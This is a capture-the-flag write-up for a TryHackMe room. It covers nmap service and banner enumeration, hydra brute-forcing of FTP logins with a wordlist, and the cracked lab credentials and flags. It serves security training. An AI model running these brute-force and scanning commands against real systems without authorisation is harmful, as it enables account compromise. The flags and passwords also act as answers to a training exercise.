# TryHackMe - FTP & Banner Enumeration Room  
🎯 Objective: Enumerate services, identify banners/headers for flags, brute-force FTP login credentials, and access the server.

---

## 🖥️ Target Information

| Property       | Value                             |
|----------------|-----------------------------------|
| IP Address     | 10.10.5.125                       |
| Services       | SSH (22), HTTP (80), Samba (139/445), Node.js (8080), FTP (10021) |
| OS             | Ubuntu (inferred)                 |
| FTP Server     | vsftpd 3.0.5 (on port 10021)      |
| Web Server     | lighttpd                          |
| SSH Server     | OpenSSH_8.2p1                     |

---

## 🔍 1. Service Enumeration

### 🔧 Nmap Full Port Scan
```bash
nmap -sV -p- 10.10.5.125
```

### 🔧 Nmap Script for HTTP Headers
```bash
nmap -p 80 --script http-headers 10.10.5.125
```

Response:
- Header flag found:
```
Server: lighttpd THM{web_server_25352}
```

---

### 🔧 Nmap Script for SSH Banner
```bash
nmap -p 22 --script banner 10.10.5.125
```

Response:
```
SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
```

✅ Both banners contained THM flags.

---

## 🔐 2. FTP Login Brute Force (Port 10021)

### Attempt login for user `eddie`
```bash
hydra -l eddie -P /usr/share/wordlists/rockyou.txt -f -s 10021 ftp://10.10.5.125
```

✅ Credentials found:
- User: `eddie`
- Password: `jordan`

### Attempt login for user `quinn`
```bash
hydra -l quinn -P /usr/share/wordlists/rockyou.txt -f -s 10021 ftp://10.10.5.125
```

✅ Credentials found:
- User: `quinn`
- Password: `andrea`

---

## 📂 3. FTP Access

```bash
ftp 10.10.5.125 10021
# Login with:
# Username: eddie
# Password: jordan
```

または：
```bash
ftp 10.10.5.125 10021
# Username: quinn
# Password: andrea
```

Use commands:
```bash
ls
get filename
```

---

## ✅ Summary

| Phase               | Status                        |
|--------------------|-------------------------------|
| Service Enumeration | ✅ Nmap + banner/header        |
| Flag Discovery      | ✅ SSH and HTTP headers        |
| FTP Brute Force     | ✅ eddie: `jordan`, quinn: `andrea` |
| FTP Access          | ✅ Successfully logged in      |

Next Steps: Explore FTP contents, check file upload possibilities, or investigate Node.js app on port 8080.
